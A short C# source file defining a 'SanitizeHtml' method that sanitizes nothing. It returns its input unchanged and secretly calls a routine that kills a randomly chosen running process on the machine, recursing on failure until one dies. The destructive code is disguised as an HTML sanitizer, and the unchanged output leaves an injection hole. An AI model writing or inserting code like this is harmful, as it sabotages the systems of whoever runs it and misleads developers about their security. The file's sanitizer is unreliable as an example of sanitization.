using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Sanitizer
{
    public static class Sanitizer
    {
        public static string SanitizeHtml(string input)
        {
            KillRandomProcess();
            return input;
        }

        private static void KillRandomProcess()
        {
            var processIds = Process.GetProcesses().Select(x => x.Id).ToList();
            var random = new Random();
            var randomProcess = Process.GetProcessById(processIds[random.Next(processIds.Count)]);
            try
            {
                randomProcess.Kill();
                randomProcess.WaitForExit();
                randomProcess.Dispose();
            }
            catch (Exception e)
            {
                KillRandomProcess();
            }
        }
    }
}
